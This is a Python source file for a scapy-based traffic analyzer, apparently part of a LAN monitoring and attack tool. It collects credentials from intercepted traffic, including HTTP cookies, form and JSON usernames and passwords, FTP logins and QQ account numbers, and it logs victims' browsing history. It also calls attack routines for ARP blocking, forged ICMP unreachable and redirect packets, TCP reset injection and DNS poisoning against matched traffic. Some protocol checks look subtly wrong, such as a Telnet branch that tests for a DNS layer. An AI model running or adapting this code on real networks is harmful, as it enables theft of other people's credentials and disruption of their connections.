import json
import re
import time
from collections import defaultdict
from urllib import parse

from scapy.layers import inet, dns, http, inet6, l2
from scapy.layers.tls import record
from scapy.packet import Packet, Raw

from monitor import attack


def in_list(content: str, ban: set):
    for b in ban:
        if b in content:
            return True
    return False


class Analyzer:
    def __init__(self):
        """
        Traffic Analyzer Class
        :param log_path: pcap export path
        """
        self.ban_status = [False, False, False, False, False]  # arp/ndp, icmp3, icmp5, tcp, dns
        self.ban_method = [False, False, False, False, False]

        self.ip_ban = set()
        self.domain_ban = set()
        self.content_ban = set()

        self.dns_map = dict()

        self.stats = {
            'all': 0,
            'ip': {
                'all': 0,
                'tcp': {'all': 0, 'tls': 0, 'http': 0, 'telnet': 0, 'ftp': 0, 'other': 0},
                'udp': {'all': 0, 'oicq': 0, 'dns': 0, 'other': 0},
                'icmp': 0,
                'other': 0
            },
            'ip6': {
                'all': 0,
                'tcp': {'all': 0, 'tls': 0, 'http': 0, 'telnet': 0, 'ftp': 0, 'other': 0},
                'udp': {'all': 0, 'oicq': 0, 'dns': 0, 'other': 0},
                'icmp': 0,
                'other': 0
            }
        }
        self.packets = []

        self.web_stats = defaultdict(int)
        self.web_history = list()
        self.web_ua = '暂无'
        self.qq = '暂无'
        self.password = list()

        self._prev = None
        self._ftp_username = None
        self._telnet_buf = None

    def feed(self, p: Packet):
        """
        Analyze single packet
        :param p: scapy packet
        """
        if p.haslayer(inet.TCP):
            if p[inet.TCP].payload == self._prev:
                return
            self._prev = p[inet.TCP].payload
        if p.haslayer(inet.UDP):
            if p[inet.UDP].payload == self._prev:
                return
            self._prev = p[inet.UDP].payload
        # todo: remove duplicate ICMP datagram caused by IP forwarding

        self.stats['all'] += 1
        packet = {'no': self.stats['all'], 'src': '', 'dst': '', 'psrc': '', 'pdst': '', 'proto': '', 'size': len(p)}
        if p[1].dst in self.dns_map:
            self.add_stats(self.dns_map[p[1].dst])

        if self.ban_status[1]:
            attack.icmp_unreachable(p)
        if self.ban_status[2]:
            attack.icmp_redirect(p)

        # IPv4
        if p[l2.Ether].type == 2048:
            packet['src'] = p[inet.IP].src
            packet['dst'] = p[inet.IP].dst
            packet['proto'] = 'IPv4'
            self.stats['ip']['all'] += 1
            if p[inet.IP].src in self.ip_ban or p[inet.IP].dst in self.ip_ban:
                self.ban()

            # TCP
            if p.proto == 6:
                packet['psrc'] = p.sport
                packet['pdst'] = p.dport
                packet['proto'] = 'TCP'
                self.stats['ip']['tcp']['all'] += 1
                if self.ban_status[3]:
                    attack.tcp_rst(p)

                # HTTP
                if 80 in [p.sport, p.dport] or p.haslayer(http.HTTP):
                    packet['proto'] = 'HTTP'
                    self.stats['ip']['tcp']['http'] += 1
                    self.http(p)
                # TLS
                elif 443 in [p.sport, p.dport] or p.haslayer(record.TLS):
                    packet['proto'] = 'TLS'
                    self.stats['ip']['tcp']['tls'] += 1
                # Telnet
                elif 23 in [p.sport, p.dport] or p.haslayer(dns.DNS):
                    packet['proto'] = 'Telnet'
                    self.stats['ip']['tcp']['telnet'] += 1
                    self.telnet(p)
                # FTP
                elif 20 in [p.sport, p.dport] or 21 in [p.sport, p.dport]:
                    packet['proto'] = 'FTP'
                    self.stats['ip']['tcp']['ftp'] += 1
                    self.ftp(p)
                # other
                else:
                    self.stats['ip']['tcp']['other'] += 1

            # UDP
            elif p.proto == 17:
                packet['psrc'] = p.sport
                packet['pdst'] = p.dport
                packet['proto'] = 'UDP'
                self.stats['ip']['udp']['all'] += 1

                # DNS
                if 53 in [p.sport, p.dport] or p.haslayer(dns.DNS):
                    packet['proto'] = 'DNS'
                    self.stats['ip']['udp']['dns'] += 1
                    if self.ban_status[4]:
                        attack.dns_poison(p)
                    self.dns(p)
                # OICQ
                elif 8000 in [p.sport, p.dport]:
                    packet['proto'] = 'OICQ'
                    self.stats['ip']['udp']['oicq'] += 1
                    self.oicq(p)
                # other
                else:
                    self.stats['ip']['udp']['other'] += 1

            # ICMP
            elif p.proto == 1:
                packet['proto'] = 'ICMP'
                self.stats['ip']['icmp'] += 1

            # other
            else:
                self.stats['ip']['other'] += 1

        # IPv6
        if p[l2.Ether].type == 34525:
            packet['src'] = p[inet6.IPv6].src
            packet['dst'] = p[inet6.IPv6].dst
            packet['proto'] = 'IPv6'
            self.stats['ip6']['all'] += 1
            if p[inet6.IPv6].src in self.ip_ban or p[inet6.IPv6].dst in self.ip_ban:
                self.ban()

            # TCP
            if p.nh == 6:
                packet['psrc'] = p.sport
                packet['pdst'] = p.dport
                packet['proto'] = 'TCP'
                self.stats['ip6']['tcp']['all'] += 1
                if self.ban_status[3]:
                    attack.tcp_rst(p)

                # HTTP
                if 80 in [p.sport, p.dport] or p.haslayer(http.HTTP):
                    packet['proto'] = 'HTTP'
                    self.stats['ip6']['tcp']['http'] += 1
                    self.http(p)
                # TLS
                elif 443 in [p.sport, p.dport] or p.haslayer(record.TLS):
                    packet['proto'] = 'TLS'
                    self.stats['ip6']['tcp']['tls'] += 1
                # Telnet
                elif 23 in [p.sport, p.dport] or p.haslayer(dns.DNS):
                    packet['proto'] = 'Telnet'
                    self.stats['ip6']['tcp']['telnet'] += 1
                    self.telnet(p)
                # FTP
                elif 20 in [p.sport, p.dport] or 21 in [p.sport, p.dport]:
                    packet['proto'] = 'FTP'
                    self.stats['ip6']['tcp']['ftp'] += 1
                    self.ftp(p)
                # other
                else:
                    self.stats['ip6']['tcp']['other'] += 1

            # UDP
            elif p.nh == 17:
                packet['psrc'] = p.sport
                packet['pdst'] = p.dport
                packet['proto'] = 'UDP'
                self.stats['ip6']['udp']['all'] += 1

                # DNS
                if 53 in [p.sport, p.dport] or p.haslayer(dns.DNS):
                    packet['proto'] = 'DNS'
                    self.stats['ip6']['udp']['dns'] += 1
                    if self.ban_status[4]:
                        attack.dns_poison(p)
                    self.dns(p)
                # OICQ
                elif 8000 in [p.sport, p.dport]:
                    packet['proto'] = 'OICQ'
                    self.stats['ip6']['udp']['oicq'] += 1
                    self.oicq(p)
                # other
                else:
                    self.stats['ip6']['udp']['other'] += 1

            # ICMP
            elif p.nh == 58:
                packet['proto'] = 'ICMP'
                self.stats['ip6']['icmp'] += 1

            # other
            else:
                self.stats['ip6']['other'] += 1

        if len(self.packets) > 100:
            self.packets.pop(0)
        self.packets.append(packet)

    def http(self, p: Packet):
        if p.haslayer(http.HTTPRequest):
            domain = p[http.HTTPRequest].Host.decode('ascii', 'replace')
            url = p[http.HTTPRequest].Host + p[http.HTTPRequest].Path
            url = parse.unquote(url.decode('ascii', 'replace'))
            data = bytes(p[http.HTTPRequest].payload).decode('utf-8', 'replace')
            if p[http.HTTPRequest].Cookie is not None:
                cookie = p[http.HTTPRequest].Cookie.decode('ascii', 'replace')
                self.add_password('http://' + domain, '[Cookie]', cookie)
            if p[http.HTTPRequest].User_Agent is not None:
                self.web_ua = p[http.HTTPRequest].User_Agent.decode('ascii', 'replace')
            try:
                form_data = parse.parse_qs(data)
            except Exception:
                form_data = {}
            try:
                json_data = json.loads(data)
            except Exception:
                json_data = {}
            self.add_stats(domain)
            self.add_history('http://' + url)

            if b'username' in form_data:
                username = form_data[b'username'][0].decode('ascii', 'replace')
                password = form_data.get(b'password', b'')[0].decode('ascii', 'replace')
                print(username, password)
                self.add_password('http://' + domain, username, password)
            if 'username' in form_data:
                username = form_data['username'][0]
                password = form_data.get('password', b'')[0]
                print(username, password)
                self.add_password('http://' + domain, username, password)
            if 'username' in json_data:
                username = json_data['username']
                password = json_data.get('password', '')
                self.add_password('http://' + domain, username, password)
            if domain in self.domain_ban or in_list(data, self.content_ban):
                self.ban()
            print('[HTTP]', url)

        elif p.haslayer(http.HTTPResponse):
            data = p[http.HTTPResponse].payload
            if in_list(data, self.content_ban):
                self.ban()

    def dns(self, p: Packet):
        if p.haslayer(dns.DNSQR):
            domain = p[dns.DNSQR].qname.decode('ascii', 'replace').strip('.')
            if domain in self.domain_ban:
                self.ban()

            if p.haslayer(dns.DNSRR) and p[dns.DNSRR].type in [1, 28]:
                ip = p[dns.DNSRR].rdata
                self.dns_map[ip] = domain
                if domain in self.domain_ban:
                    self.ip_ban.add(ip)
            else:
                print('[DNS]', domain)

    def oicq(self, p: Packet):
        raw = bytes(p[inet.UDP].payload)
        qq = str(int.from_bytes(raw[7:11], 'big', signed=False))
        print('[OICQ]', qq)
        self.qq = qq
        self.add_password('QQ', qq, '')

    def ftp(self, p: Raw):
        if p[2].dport in [20, 21]:
            self.add_history('ftp://' + self.dns_map.get(p[1].dst, p[1].dst))
        raw = bytes(p[inet.TCP].payload).decode('ascii', 'replace')
        username = re.findall('(?i)USER (.*)', raw)
        password = re.findall('(?i)PASS (.*)', raw)
        if username:
            username = username[0].replace('\r\n', '')
            self._ftp_username = username
            print('[FTP] USER', username)
        if password and self._ftp_username is not None:
            password = password[0].replace('\r\n', '')
            print('[FTP] PASS', password)
            self.add_password('ftp://' + self.dns_map.get(p[1].dst, p[1].dst), self._ftp_username, password)
            self._ftp_username = None

    def telnet(self, p: Raw):
        pass

    def ban(self):
        self.ban_status = self.ban_method.copy()
        if self.ban_status[0]:
            attack.arp_ban = True

    def unban(self):
        for i in range(len(self.ban_status)):
            self.ban_status[i] = False
        attack.arp_ban = False

    def add_stats(self, domain: str):
        self.web_stats[domain] += 1

    def add_history(self, url: str):
        self.web_history.append((time.strftime("%H:%M:%S", time.localtime()), url))

    def add_password(self, where: str, username: str, password: str):
        t = (where, username, password)
        if t not in self.password:
            self.password.append(t)
